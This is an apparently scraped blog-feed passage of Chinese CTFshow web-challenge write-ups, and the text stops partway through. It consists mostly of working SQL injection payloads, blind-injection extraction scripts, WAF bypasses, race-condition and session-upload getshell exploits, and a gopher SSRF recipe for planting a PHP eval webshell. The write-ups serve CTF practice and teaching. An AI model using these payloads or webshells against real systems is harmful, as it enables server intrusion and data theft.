https://www.alibabacloud.com/help/zh/doc-detail/84813.htm","categories":[],"tags":[{"name":"日志","slug":"日志","permalink":"http://www.moonback.xyz/tags/%E6%97%A5%E5%BF%97/"}]},{"title":"CTFshow部分题目writeup-2","slug":"ctfshow部分题目writeup-2","date":"2020-02-17T14:03:49.000Z","updated":"2021-02-17T14:03:33.098Z","comments":true,"path":"2020/02/17/ctfshow部分题目writeup-2/","link":"","permalink":"http://www.moonback.xyz/2020/02/17/ctfshow%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AEwriteup-2/","excerpt":"本篇博客主要介绍了ctfshow上web部分题目的writeup！","text":"本篇博客主要介绍了ctfshow上web部分题目的writeup！ sql注入web1711?id&#x3D;1&#39; or 1%23 直接万能密码 web172联合查询 1v2.php?id&#x3D;-1&#39; union select 1,password from ctfshow_user2 where username&#x3D;&#39;flag&#39;%23 web173返回结果过滤了flag字样 hex编码 1v3.php?id&#x3D;-1&#39; union select 1,2,hex(password) from ctfshow_user3 where username&#x3D;&#39;flag&#39;%23 web174返回结果过滤了flag和数字 盲注 或者进行替换 感觉还是盲注方便 1v4.php?id=-1&#x27; union select &#x27;a&#x27;,REPLACE(REPLACE(REPLACE(REPLACE(REPLACE(REPLACE(REPLACE(REPLACE(REPLACE(REPLACE(REPLACE(password,&#x27;0&#x27;,&#x27;~&#x27;),&#x27;1&#x27;,&#x27;!&#x27;),&#x27;2&#x27;,&#x27;@&#x27;),&#x27;3&#x27;,&#x27;=&#x27;),&#x27;4&#x27;,&#x27;$&#x27;),&#x27;5&#x27;,&#x27;%&#x27;),&#x27;6&#x27;,&#x27;^&#x27;),&#x27;7&#x27;,&#x27;*&#x27;),&#x27;8&#x27;,&#x27;&lt;&#x27;),&#x27;9&#x27;,&#x27;&gt;&#x27;),&#x27;flag&#x27;,&#x27;&#x27;) from ctfshow_user4 where username=&#x27;flag&#x27;%23 再替换回来 1select REPLACE(REPLACE(REPLACE(REPLACE(REPLACE(REPLACE(REPLACE(REPLACE(REPLACE(REPLACE(&#x27;~$%%%~^%-~%&lt;e-$~&lt;f-&lt;cc=-&lt;@@d^@=eda@e&#x27;,&#x27;~&#x27;,&#x27;0&#x27;),&#x27;!&#x27;,&#x27;1&#x27;),&#x27;@&#x27;,&#x27;2&#x27;),&#x27;=&#x27;,&#x27;3&#x27;),&#x27;$&#x27;,&#x27;4&#x27;),&#x27;%&#x27;,&#x27;5&#x27;),&#x27;^&#x27;,&#x27;6&#x27;),&#x27;*&#x27;,&#x27;7&#x27;),&#x27;&lt;&#x27;,&#x27;8&#x27;),&#x27;&gt;&#x27;,&#x27;9&#x27;) bool盲注脚本： 12345678910111213141516171819202122232425262728import requestsurl = &quot;http://41f0fa36-920b-4c51-8164-c4285adadf19.chall.ctf.show/api/v4.php?id=1&quot;flag = &#x27;&#x27;for i in range(1,50): f1=flag top=127 low=33 while low&lt;=top: mid=(top+low)//2 p1=&#x27;\\&#x27; and if(ascii(substr((select password from ctfshow_user4 where username=\\&#x27;flag\\&#x27;),&#123;&#125;,1))&gt;&#123;&#125;,1,0)--+&#x27;.format(str(i),str(mid)) p2=&#x27;\\&#x27; and if(ascii(substr((select password from ctfshow_user4 where username=\\&#x27;flag\\&#x27;),&#123;&#125;,1))=&#123;&#125;,1,0)--+&#x27;.format(str(i),str(mid)) try: r1=requests.get(url+p2) print(i,mid) if &#x27;username&quot;:&quot;admin&#x27; in r1.text: flag+=chr(mid) print(flag) break r=requests.get(url+p1) if &#x27;username&quot;:&quot;admin&#x27; in r.text: low=mid+1 else: top=mid-1 except Exception as e: pass if flag==f1: break web175返回结果过滤了\\x00-\\x7f 直接盲注吧 bool盲注也不行了 换时间盲注 1234567891011121314151617181920212223242526272829303132import requestsurl = &quot;http://40dd5eb6-18de-48c2-bb1e-db759aa222bd.chall.ctf.show/api/v5.php?id=1&quot;flag = &#x27;&#x27;for i in range(1,50): f1=flag top=127 low=33 while low&lt;=top: mid=(top+low)//2 p1=&#x27;\\&#x27; and if(ascii(substr((select password from ctfshow_user5 where username=\\&#x27;flag\\&#x27;),&#123;&#125;,1))=&#123;&#125;,sleep(3),0)--+&#x27;.format(str(i),str(mid)) p2=&#x27;\\&#x27; and if(ascii(substr((select password from ctfshow_user5 where username=\\&#x27;flag\\&#x27;),&#123;&#125;,1))&gt;&#123;&#125;,sleep(3),0)--+&#x27;.format(str(i),str(mid)) try: print(i,mid) r1=requests.get(url+p1,timeout=3) except requests.exceptions.ReadTimeout as e: flag+=chr(mid) print(flag) break except Exception as e: pass else: try: r2=requests.post(url+p2,timeout=3) except requests.exceptions.ReadTimeout as e: low=mid+1 except Exception as e: pass else: top=mid-1 if flag==f1: break web1761?id&#x3D;1&#39; or 1%23 web177过滤空格 1?id&#x3D;1&#39;&#x2F;**&#x2F;or&#x2F;**&#x2F;1%23 web178过滤空格 过滤/**/ 1?id&#x3D;1&#39;%09or%091%23 web179过滤%09 1?id&#x3D;1&#39;or(1)%23 web180注释符号过滤了 指定id绕过 1?id&#x3D;0&#39;||id&#x3D;26||&#39; 联合查询 1&#39;union%0cselect%0c1,2,group_concat(password)%0cfrom%0cctfshow_user%0cwhere%0c&#39;1&#39;&#x3D;&#39;1 web181过滤 123function waf($str)&#123; return preg_match(&#x27;/ |\\*|\\x09|\\x0a|\\x0b|\\x0c|\\x00|\\x0d|\\xa0|\\x23|\\#|file|into|select/i&#x27;, $str);&#125; 同样 1?id&#x3D;0&#39;||id&#x3D;26||&#39; web182过滤 123function waf($str)&#123; return preg_match(&#x27;/ |\\*|\\x09|\\x0a|\\x0b|\\x0c|\\x00|\\x0d|\\xa0|\\x23|\\#|file|into|select|flag/i&#x27;, $str);&#125; 同样 1?id&#x3D;0&#39;||id&#x3D;26||&#39; web183sql 1$sql = &quot;select count(pass) from &quot;.$_POST[&#x27;tableName&#x27;].&quot;;&quot;; 过滤 123function waf($str)&#123; return preg_match(&#x27;/ |\\*|\\x09|\\x0a|\\x0b|\\x0c|\\x0d|\\xa0|\\x00|\\#|\\x23|file|\\=|or|\\x7c|select|and|flag|into/i&#x27;, $str);&#125; 盲注 1234567891011121314151617import requestsurl=&quot;http://1e1b7dde-8bd4-4a70-9517-4b8b96427db3.chall.ctf.show:8080/select-waf.php&quot;flag = &quot;ctfshow&#123;&quot;s = &#x27;&quot;0123456789abcdefghijklmnopqrstuvwxyz-&#123;&#125;&quot;&#x27;for i in range(0,100): for j in s: data=&#123; &#x27;tableName&#x27;:&quot;(ctfshow_user)where(pass)like&#x27;&#123;&#125;%&#x27;&quot;.format(flag+j) &#125; r=requests.post(url,data=data) if &quot;$user_count = 1&quot; in r.text: flag+=j print(flag) breakprint(flag)","categories":[],"tags":[{"name":"CTFshow","slug":"CTFshow","permalink":"http://www.moonback.xyz/tags/CTFshow/"},{"name":"wirteup","slug":"wirteup","permalink":"http://www.moonback.xyz/tags/wirteup/"}]},{"title":"CTFshow部分题目writeup-1","slug":"ctfshow部分题目writeup","date":"2020-02-17T14:02:49.000Z","updated":"2021-02-23T13:26:00.257Z","comments":true,"path":"2020/02/17/ctfshow部分题目writeup/","link":"","permalink":"http://www.moonback.xyz/2020/02/17/ctfshow%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AEwriteup/","excerpt":"本篇博客主要介绍了ctfshow上web部分题目的writeup！","text":"本篇博客主要介绍了ctfshow上web部分题目的writeup！ 红包题红包题第二弹查看源代码，发现hint，访问发现： 12345678910111213&lt;?phpif(isset($_GET[&#x27;cmd&#x27;]))&#123; $cmd=$_GET[&#x27;cmd&#x27;]; highlight_file(__FILE__); if(preg_match(&quot;/[A-Za-oq-z0-9$]+/&quot;,$cmd))&#123; die(&quot;cerror&quot;); &#125; if(preg_match(&quot;/\\~|\\!|\\@|\\#|\\%|\\^|\\&amp;|\\*|\\(|\\)|\\（|\\）|\\-|\\_|\\&#123;|\\&#125;|\\[|\\]|\\&#x27;|\\&quot;|\\:|\\,/&quot;,$cmd))&#123; die(&quot;serror&quot;); &#125; eval($cmd);&#125;?&gt; 我第一次想到的是php正则回溯，然而不是，不绕弯子 过滤了好多东西，但发现./&lt;&gt;?p以及反引号并没有过滤，这里就要介绍一个概念php临时文件 文件被上传后，默认会被存储到服务端的默认临时目录中，该临时目录由php.ini的upload_tmp_dir属性指定 在上传存储到临时目录后，临时文件命名的规则：默认为 php+4或者6位随机数字和大小写字母 因此我们就可以尝试上传一个文件，然后绕过用通配符和短标签来执行该文件，exp: 12345678910111213141516171819202122import requestsimport threadingurl1=&#x27;http://7653b365-217d-4cd7-91c9-e620b64e0638.challenges.ctf.show/?cmd=?&gt;&lt;?=`.+/???/p?p??????`;&#x27; #加号用来分隔也可以用空格，短标签的后半部分可以不加url=&#x27;http://7653b365-217d-4cd7-91c9-e620b64e0638.challenges.ctf.show/&#x27;proxies=&#123; &#x27;http&#x27;:&#x27;http://127.0.0.1:8080&#x27; &#125;def post(): files=&#123; &#x27;upload&#x27;:&#x27;#!/bin/sh\\necho 1433223\\nls /\\ncat /flag.txt&#x27; &#125; r=requests.post(url,files=files)def req(): r=requests.get(url1) if &#x27;1433223&#x27; in r.text: print(r.text)for i in range(50): threading.Thread(target=post,args=()).start()for i in range(50): threading.Thread(target=req,args=()).start() 红包题第六弹hint提示不是sql注入，要找源码，dirsearch扫目录发现 www.zip里有check.php的关键代码 123456789101112131415161718192021222324252627282930313233343536373839404142function receiveStreamFile($receiveFile)&#123; $streamData = isset($GLOBALS[&#x27;HTTP_RAW_POST_DATA&#x27;])? $GLOBALS[&#x27;HTTP_RAW_POST_DATA&#x27;] : &#x27;&#x27;; if(empty($streamData))&#123; $streamData = file_get_contents(&#x27;php://input&#x27;); &#125; if($streamData!=&#x27;&#x27;)&#123; $ret = file_put_contents($receiveFile, $streamData, true); &#125;else&#123; $ret = false; &#125; return $ret; &#125;if(md5(date(&quot;i&quot;)) === $token)&#123; $receiveFile = &#x27;flag.dat&#x27;; receiveStreamFile($receiveFile); if(md5_file($receiveFile)===md5_file(&quot;key.dat&quot;))&#123; if(hash_file(&quot;sha512&quot;,$receiveFile)!=hash_file(&quot;sha512&quot;,&quot;key.dat&quot;))&#123; $ret[&#x27;success&#x27;]=&quot;1&quot;; $ret[&#x27;msg&#x27;]=&quot;人脸识别成功!$flag&quot;; $ret[&#x27;error&#x27;]=&quot;0&quot;; echo json_encode($ret); return; &#125; $ret[&#x27;errormsg&#x27;]=&quot;same file&quot;; echo json_encode($ret); return; &#125; $ret[&#x27;errormsg&#x27;]=&quot;md5 error&quot;; echo json_encode($ret); return;&#125; $ret[&#x27;errormsg&#x27;]=&quot;token error&quot;;echo json_encode($ret);return; 查看key.dat发现明显是用fastcoll生成的，但题目并不是这种思路 介绍一下fastcoll，工具可以用来生成两个MD5值相同但内容不相同的文件 1fastcoll_v1.0.0.5.exe -p init.txt -o 1.txt 2.txt -p 是源文件, -o 是输出文件(两个)，同样我们也可以用工具生成四个MD5相同但内容不同的文件 先生成两个MD5相同但内容不同的文件 1fastcoll_v1.0.0.5.exe -o 1.txt 2.txt 取其中一个文件作为源文件再生成两个MD5相同但内容不同的文件 1fastcoll_v1.0.0.5.exe -p 1.txt -o 3.txt 4.txt 可以看到1.txt 2.txt是128字节，而3.txt 4.txt是256字节，因此我们只需要将3.txt,4.txt文件后128字节取出来放在2.txt后面，便可以有四个MD5相同内容不相同的文件 取出可以用tail,下载连接：https://www.trisunsoft.com/tail-for-windows.htm 12tail.exe -c 128 3.txt &gt; atail.exe -c 128 4.txt &gt; b 合成可用win自带的type 12type 2.txt a &gt; 5.txttype 2.txt b &gt; 6.txt 当然也可以用hxd 再说本题 ，题目考察的是条件竞争，即我们只需满足第一个MD5比较之后然后更改文件内容即可，exp: 123456789101112131415161718192021222324import requestsimport timeimport hashlibimport threadingdef post(data): try: r=requests.post(url,data=data) if &quot;flag&quot; in r.text: print(r.text) except Exception as e: passmi=str(time.localtime().tm_min)m=hashlib.md5(mi.encode()).hexdigest()url=&#x27;http://124.156.121.112:28047/check.php?token=&#123;&#125;&amp;php://input&#x27;.format(m)with open(&#x27;key.dat&#x27;,&#x27;rb&#x27;) as f: data1=f.read()with open(&#x27;nokey.dat&#x27;,&#x27;rb&#x27;) as f: data2=f.read()for i in range(30): threading.Thread(target=post,args=(data1,)).start()for i in range(30): threading.Thread(target=post,args=(data2,)).start() 参考： https://xz.aliyun.com/t/2232 红包题第九弹很明显是ssrf gopher://协议攻击mysql，试了很久，都没成功，还是tcl，最重要的url编码忘记了，我TM 下面介绍三种方式生成payload: tcpdump准备工作： mysql设置无密码，我这里用的是kali2019.3 直接在配置文件/etc/mysql/mariadb.conf.d/50-server.cnf里的[mysqld]下面增加一行 1skip-grant-tables 重启mysql 1service mysql restart 不行就 12/usr/share/mysql/mysql.server stop/usr/share/mysql/mysql.server start /var/www/html有写权限，其实这个无所谓，抓的只是流量 1chmod 777 /var/www/html tcpdump监听lo网卡3306端口流量，保存在文件里 1tcpdump -i lo port 3306 -w mysql.pacp 然后执行 1mysql -u root -h 127.0.0.1 在sql命令行执行 12select &#x27;&lt;?php @eval($_POST[1]);?&gt;&#x27; into outfile &quot;/var/www/html/moonback.php&quot;;exit 然后wireshark打开，追踪tcp流 选择原始数据，保存到一个文件，hxd打开把16进制复制到txt中，然后空格替换%号，别忘了第一个增加% 然后就可以发送给服务端了，注意要url编码一次 common-gopher-tcp-streamgithub地址：https://github.com/firebroo/sec_tools/tree/master/common-gopher-tcp-stream 这个工具直接把编码后的显示出来了，很方便 下载下来首先make编译一下 然后监听,端口和-p必须挨着 1./sniffer -p3306 接着和上面一样 123mysql -u root -h 127.0.0.1select &#x27;&lt;?php @eval($_POST[1]);?&gt;&#x27; into outfile &quot;/var/www/html/moonback.php&quot;;exit 然后提交的时候注意url再编码一次就行 仔细看了看发现除了大小写，两个流量没啥差别，都是16进制，大小写无所谓 Gopherusgithub地址：https://github.com/tarunkant/Gopherus 直接用工具生成也行，注意url编码,我真垃圾 webweb2布尔盲注，没啥过滤，直接跑，exp: 12345678910111213141516171819202122232425262728import requestsurl=&quot;http://783dfdd8-9d2e-4e68-b3df-e1b718d4a572.chall.ctf.show/&quot;flag=&#x27;&#x27;for i in range(1,50): f1=flag top=127 low=33 while low&lt;=top: mid=(top+low)//2 data=&#123;&#x27;username&#x27;:&quot;admin&#x27; or if(ascii(substr((select flag from web2.flag),&#123;&#125;,1))&gt;&#123;&#125;,1,0)#&quot;.format(str(i),str(mid)),&#x27;password&#x27;:&#x27;admin&#x27;&#125; data1=&#123;&#x27;username&#x27;:&quot;admin&#x27; or if(ascii(substr((select flag from web2.flag),&#123;&#125;,1))=&#123;&#125;,1,0)#&quot;.format(str(i),str(mid)),&#x27;password&#x27;:&#x27;admin&#x27;&#125; try: r1=requests.post(url,data=data1) print(i,mid) if &#x27;ctfshow&#x27; in r1.text: flag+=chr(mid) print(flag) break r=requests.post(url,data=data) if &#x27;ctfshow&#x27; in r.text: low=mid+1 else: top=mid-1 except Exception as e: pass if flag==f1: break web3allow_url_fopen和allow_url_include都开启了，直接php://input 123?url&#x3D;php:&#x2F;&#x2F;inputPOST: &lt;?php system(&#39;cat ctf_go_go_go &#39;); web4过滤了php，直接session_upload_progress GETshell 12345678910111213141516171819202122232425262728import requestsimport threadingurl=&#x27;http://5c452cf4-fc3f-45c0-a872-3e818ec53c43.chall.ctf.show/&#x27;r=requests.session()headers=&#123; &quot;Cookie&quot;:&#x27;PHPSESSID=mb&#x27;&#125;def POST(): files=&#123; &quot;upload&quot;:&#x27;&#x27; #上传无效的空文件 &#125; data=&#123; &quot;PHP_SESSION_UPLOAD_PROGRESS&quot;:&#x27;&lt;?php echo &quot;moonback&quot;;file_put_contents(&quot;/tmp/mb&quot;, base64_decode(&quot;PD9waHAgQGV2YWwoJF9QT1NUWzFdKTs=&quot;));?&gt;&#x27; #恶意进度信息，readfile将直接输出文件内容 &#125; r.post(url,files=files,headers=headers,data=data)def READ(): while True: POST() t=r.get(&quot;http://5c452cf4-fc3f-45c0-a872-3e818ec53c43.chall.ctf.show/?url=/tmp/sess_mb&quot;) if &#x27;moonback&#x27; in t.text: print(&#x27;[+] ok&#x27;) else: continuefor i in range(50): threading.Thread(target=READ,args=()).start() web5源码： 12345678910111213141516171819&lt;?php$flag=&quot;&quot;;$v1=$_GET[&#x27;v1&#x27;];$v2=$_GET[&#x27;v2&#x27;];if(isset($v1) &amp;&amp; isset($v2))&#123; if(!ctype_alpha($v1))&#123; die(&quot;v1 error&quot;); &#125; if(!is_numeric($v2))&#123; die(&quot;v2 error&quot;); &#125; if(md5($v1)==md5($v2))&#123; echo $flag; &#125;&#125;else&#123; echo &quot;where is flag?&quot;;&#125;?&gt; md5弱比较，payload 1?v1&#x3D;QNKCDZO&amp;v2&#x3D;240610708 web6就比web2多过滤个空格 12345678910111213141516171819202122232425262728import requestsurl=&quot;http://7d7d60c5-b0fa-498e-842e-c12ef1378f0b.chall.ctf.show/&quot;flag=&#x27;&#x27;for i in range(1,50): f1=flag top=127 low=33 while low&lt;=top: mid=(top+low)//2 data=&#123;&#x27;username&#x27;:&quot;admin&#x27;/**/or/**/if(ascii(substr((select/**/flag/**/from/**/web2.flag),&#123;&#125;,1))&gt;&#123;&#125;,1,0)#&quot;.format(str(i),str(mid)),&#x27;password&#x27;:&#x27;admin&#x27;&#125; data1=&#123;&#x27;username&#x27;:&quot;admin&#x27;/**/or/**/if(ascii(substr((select/**/flag/**/from/**/web2.flag),&#123;&#125;,1))=&#123;&#125;,1,0)#&quot;.format(str(i),str(mid)),&#x27;password&#x27;:&#x27;admin&#x27;&#125; try: r1=requests.post(url,data=data1) print(i,mid) if &#x27;ctfshow&#x27; in r1.text: flag+=chr(mid) print(flag) break r=requests.post(url,data=data) if &#x27;ctfshow&#x27; in r.text: low=mid+1 else: top=mid-1 except Exception as e: pass if flag==f1: break web7数字型布尔注入，过滤空格 12345678910111213141516171819202122232425262728import requestsurl&#x3D;&quot;http:&#x2F;&#x2F;e3a532c0-bca9-4abc-a724-1adb2b991432.chall.ctf.show&#x2F;index.php?id&#x3D;&quot;flag&#x3D;&#39;&#39;for i in range(1,50): f1&#x3D;flag top&#x3D;127 low&#x3D;33 while low&lt;&#x3D;top: mid&#x3D;(top+low)&#x2F;&#x2F;2 p1&#x3D;&quot;if(ascii(substr((select&#x2F;**&#x2F;flag&#x2F;**&#x2F;from&#x2F;**&#x2F;web7.flag),&#123;&#125;,1))&gt;&#123;&#125;,1,0)#&quot;.format(str(i),str(mid)) p2&#x3D;&quot;if(ascii(substr((select&#x2F;**&#x2F;flag&#x2F;**&#x2F;from&#x2F;**&#x2F;web7.flag),&#123;&#125;,1))&#x3D;&#123;&#125;,1,0)#&quot;.format(str(i),str(mid)) try: r1&#x3D;requests.get(url+p2) print(i,mid) if &#39;pitch-and-toss,&#39; in r1.text: flag+&#x3D;chr(mid) print(flag) break r&#x3D;requests.get(url+p1) if &#39;pitch-and-toss,&#39; in r.text: low&#x3D;mid+1 else: top&#x3D;mid-1 except Exception as e: pass if flag&#x3D;&#x3D;f1: break web8过滤空格可以用/**/，过滤if用case when 1=1 then 1 else 0 end，过滤逗号用from 1 for 1截取 12345678910111213141516171819202122232425262728import requestsurl=&quot;http://9f999441-8cb2-4663-9f55-195bbfafe615.chall.ctf.show/index.php?id=&quot;flag=&#x27;&#x27;for i in range(1,50): f1=flag top=127 low=33 while low&lt;=top: mid=(top+low)//2 p1=&quot;(case/**/when/**/(ascii(substr((select/**/flag/**/from/**/web8.flag)/**/from/**/&#123;&#125;/**/for/**/1))&gt;&#123;&#125;)/**/then/**/1/**/else/**/0/**/end)&quot;.format(str(i),str(mid)) p2=&quot;(case/**/when/**/(ascii(substr((select/**/flag/**/from/**/web8.flag)/**/from/**/&#123;&#125;/**/for/**/1))=&#123;&#125;)/**/then/**/1/**/else/**/0/**/end)&quot;.format(str(i),str(mid)) try: r1=requests.get(url+p2) print(i,mid) if &#x27;pitch-and-toss,&#x27; in r1.text: flag+=chr(mid) print(flag) break r=requests.get(url+p1) if &#x27;pitch-and-toss,&#x27; in r.text: low=mid+1 else: top=mid-1 except Exception as e: pass if flag==f1: break web9访问/robots.txt看到index.phps，源码： 123456789101112131415&lt;?php$flag=&quot;&quot;;$password=$_POST[&#x27;password&#x27;];if(strlen($password)&gt;10)&#123;die(&quot;password error&quot;);&#125;$sql=&quot;select * from user where username =&#x27;admin&#x27; and password =&#x27;&quot;.md5($password,true).&quot;&#x27;&quot;;$result=mysqli_query($con,$sql);if(mysqli_num_rows($result)&gt;0)&#123;while($row=mysqli_fetch_assoc($result))&#123;echo &quot;登陆成功&lt;br&gt;&quot;;echo $flag;&#125;&#125;?&gt; javisoj上的一道题，详细参考：https://www.moonback.xyz/2019/10/05/jarvisoj-web-wp/#Login 直接 1admin:ffifdyop web10同样访问index.phps得到源码 12345678910111213141516171819202122232425262728&lt;?php$flag=&quot;&quot;;function replaceSpecialChar($strParam)&#123; $regex = &quot;/(select|from|where|join|sleep|and|\\s|union|,)/i&quot;; return preg_replace($regex,&quot;&quot;,$strParam);&#125;if (!$con)&#123; die(&#x27;Could not connect: &#x27; . mysqli_error());&#125;if(strlen($username)!=strlen(replaceSpecialChar($username)))&#123; die(&quot;sql inject error&quot;);&#125;if(strlen($password)!=strlen(replaceSpecialChar($password)))&#123; die(&quot;sql inject error&quot;);&#125;$sql=&quot;select * from user where username = &#x27;$username&#x27;&quot;;$result=mysqli_query($con,$sql); if(mysqli_num_rows($result)&gt;0)&#123; while($row=mysqli_fetch_assoc($result))&#123; if($password==$row[&#x27;password&#x27;])&#123; echo &quot;登陆成功&lt;br&gt;&quot;; echo $flag; &#125; &#125; &#125;?&gt; 比较了替换后的长度和原来的长度，不相等就退出程序，这里有个小trick group by很好理解，根据某个字段分组嘛，加上WITH ROLLUP的意思就是在group分组字段的基础上再进行统计数据，这时就会多出一个NULL值 对于这道题，我们只需用上这个点并且设置password为空就可以登陆，由于过滤了空格需要 1admin&#39;&#x2F;**&#x2F;or&#x2F;**&#x2F;1&#x2F;**&#x2F;group&#x2F;**&#x2F;by&#x2F;**&#x2F;password&#x2F;**&#x2F;with&#x2F;**&#x2F;rollup# NULL弱等于空字符串，登陆成功 或者 1&#39;&#x3D;0&#x2F;**&#x2F;group&#x2F;**&#x2F;by&#x2F;**&#x2F;password&#x2F;**&#x2F;with&#x2F;**&#x2F;rollup&#x2F;**&#x2F;having&#x2F;**&#x2F;password&lt;&#x3D;&gt;null# web11源码： 1234567891011121314&lt;?phpfunction replaceSpecialChar($strParam)&#123; $regex = &quot;/(select|from|where|join|sleep|and|\\s|union|,)/i&quot;; return preg_replace($regex,&quot;&quot;,$strParam);&#125;if(strlen($password)!=strlen(replaceSpecialChar($password)))&#123; die(&quot;sql inject error&quot;);&#125;if($password==$_SESSION[&#x27;password&#x27;])&#123; echo $flag;&#125;else&#123; echo &quot;error&quot;;&#125;?&gt; password存在于session中，只需指定一个不存在的session id，password设置成空就行，同样是NULL弱等于空字符 web12查看源码，提示?cmd=，第一次以为是命令执行，查看phpinfo: 1?cmd&#x3D;phpinfo(); 查看源码: 1234// ?cmd=show_source(&#x27;/var/www/html/index.php&#x27;);&lt;?php$cmd=$_GET[&#x27;cmd&#x27;];eval($cmd); 查找目录,读取文件： 12?cmd&#x3D;var_dump(scandir(&#39;.&#x2F;&#39;));?cmd&#x3D;show_source(&#39;903c00105c0141fd37ff47697e916e53616e33a72fb3774ab213b3e2a732f56f.php&#39;); 不知道为啥不过滤scandir，过滤了可以用glob协议绕过 1print_r(glob(&quot;*&quot;)); web13.user.ini绕过，详细参考：https://www.moonback.xyz/2020/01/16/buuctf%E5%88%B7%E9%A2%98-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%AF%87/#SUCTF-2019-CheckIn 贴一下源码： 1234567891011121314151617181920212223242526272829&lt;?php header(&quot;content-type:text/html;charset=utf-8&quot;); $filename = $_FILES[&#x27;file&#x27;][&#x27;name&#x27;]; $temp_name = $_FILES[&#x27;file&#x27;][&#x27;tmp_name&#x27;]; $size = $_FILES[&#x27;file&#x27;][&#x27;size&#x27;]; $error = $_FILES[&#x27;file&#x27;][&#x27;error&#x27;]; $arr = pathinfo($filename); $ext_suffix = $arr[&#x27;extension&#x27;]; if ($size &gt; 24)&#123; die(&quot;error file zise&quot;); &#125; if (strlen($filename)&gt;9)&#123; die(&quot;error file name&quot;); &#125; if(strlen($ext_suffix)&gt;3)&#123; die(&quot;error suffix&quot;); &#125; if(preg_match(&quot;/php/i&quot;,$ext_suffix))&#123; die(&quot;error suffix&quot;); &#125; if(preg_match(&quot;/php/i&quot;,$filename))&#123; die(&quot;error file name&quot;); &#125; if (move_uploaded_file($temp_name, &#x27;./&#x27;.$filename))&#123; echo &quot;文件上传成功！&quot;; &#125;else&#123; echo &quot;文件上传失败！&quot;; &#125; ?&gt; web14源码： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546 &lt;?phpinclude(&quot;secret.php&quot;);if(isset($_GET[&#x27;c&#x27;]))&#123; $c = intval($_GET[&#x27;c&#x27;]); sleep($c); switch ($c) &#123; case 1: echo &#x27;$url&#x27;; break; case 2: echo &#x27;@A@&#x27;; break; case 555555: echo $url; case 44444: echo &quot;@A@&quot;; break; case 3333: echo $url; break; case 222: echo &#x27;@A@&#x27;; break; case 222: echo &#x27;@A@&#x27;; break; case 3333: echo $url; break; case 44444: echo &#x27;@A@&#x27;; case 555555: echo $url; break; case 3: echo &#x27;@A@&#x27;; case 6000000: echo &quot;$url&quot;; case 1: echo &#x27;@A@&#x27;; break; &#125;&#125;highlight_file(__FILE__); 由于switch没有碰到break时会一直往下执行，直接让c等于3就能输出$url，访问，查看源码： 123if(preg_match(&#x27;/information_schema\\.tables|information_schema\\.columns|linestring| |polygon/is&#x27;, $_GET[&#x27;query&#x27;]))&#123; die(&#x27;@A@&#x27;);&#125; 和web7差不多，跑了下版本发现是：10.2.26-MariaDB-log，所有数据库： 1information_schema,mysql,performance_schema,web 可以通过information_schema中的其他表来bypass，详细参考：https://osandamalith.com/2020/01/27/alternatives-to-extract-tables-and-columns-from-mysql-and-mariadb 12345//爆表SELECT/**/group_concat(TABLE_NAME)/**/FROM/**/information_schema.KEY_COLUMN_USAGE/**/WHERE/**/table_schema=DATABASE()//爆第一列SELECT/**/group_concat(COLUMN_NAME)/**/FROM/**/information_schema.KEY_COLUMN_USAGE/**/WHERE/**/table_schema=DATABASE()/**/and/**/table_name=&#x27;content&#x27; 剩下的就要无列名注入了，需要先猜列数，exp： 12345678910111213141516171819202122232425262728import requestsurl=&quot;http://fbae9ee1-b59d-4b25-a39d-0e4af175f5da.chall.ctf.show/here_1s_your_f1ag.php?query=&quot;flag=&#x27;&#x27;for i in range(1,50): f1=flag top=127 low=32 while low&lt;=top: mid=(top+low)//2 p1=&quot;if(ascii(substr((select/**/group_concat(`3`)/**/from/**/(select/**/1,2,3/**/union/**/select/**/*/**/from/**/content)a),&#123;&#125;,1))&gt;&#123;&#125;,1,0)#&quot;.format(str(i),str(mid)) p2=&quot;if(ascii(substr((select/**/group_concat(`3`)/**/from/**/(select/**/1,2,3/**/union/**/select/**/*/**/from/**/content)a),&#123;&#125;,1))=&#123;&#125;,1,0)#&quot;.format(str(i),str(mid)) try: r1=requests.get(url+p2) print(i,mid) if &#x27;admin&#x27; in r1.text: flag+=chr(mid) print(flag) break r=requests.get(url+p1) if &#x27;admin&#x27; in r.text: low=mid+1 else: top=mid-1 except Exception as e: pass if flag==f1: break 跑出来flag不在这，其实那个过滤很鸡肋，直接反引号就可以绕过，并且可以联合查询，沙雕了！ 123?query&#x3D;1&#x2F;**&#x2F;order&#x2F;**&#x2F;by&#x2F;**&#x2F;1%23?query&#x3D;-1&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;load_file(&#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;here_1s_your_f1ag.php&#39;)%23 here_1s_your_f1ag.php源码： 12345678910111213141516&lt;?phpinclude(&quot;config.php&quot;);$db = new sql();if(isset($_GET[&#x27;query&#x27;]) &amp;&amp; $_GET[&#x27;query&#x27;] !== &#x27;&#x27;)&#123; $id = $_GET[&#x27;query&#x27;]; if(preg_match(&#x27;/information_schema\\.tables|information_schema\\.columns|linestring| |polygon/is&#x27;, $_GET[&#x27;query&#x27;]))&#123; die(&#x27;@A@&#x27;); &#125;&#125;else&#123; $id = 1;&#125;$sql_ = &quot;select username from content where id=$id&quot;;$db = new sql();echo &quot;&lt;script&gt;alert(&#x27;&quot;.$db-&gt;getone($sql_)[0].&quot;&#x27;) 通过查看secret.php得到flag的位置，读flag 1?query&#x3D;-1&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;load_file(&#39;&#x2F;real_flag_is_here&#39;)%23 web15 FishmanWEB_给你shell_36D杯查看源码发现?view_source，得到源码： 12345678910111213141516171819202122232425262728293031323334353637383940 &lt;?php//It&#x27;s no need to use scanner. Of course if you want, but u will find nothing.error_reporting(0);include &quot;config.php&quot;;if (isset($_GET[&#x27;view_source&#x27;])) &#123; show_source(__FILE__); die;&#125;function checkCookie($s) &#123; $arr = explode(&#x27;:&#x27;, $s); if ($arr[0] === &#x27;&#123;&quot;secret&quot;&#x27; &amp;&amp; preg_match(&#x27;/^[\\&quot;0-9A-Z]*&#125;$/&#x27;, $arr[1]) &amp;&amp; count($arr) === 2 ) &#123; return true; &#125; else &#123; if ( !theFirstTimeSetCookie() ) setcookie(&#x27;secret&#x27;, &#x27;&#x27;, time()-1); return false; &#125;&#125;function haveFun($_f_g) &#123; $_g_r = 32; $_m_u = md5($_f_g); $_h_p = strtoupper($_m_u); for ($i = 0; $i &lt; 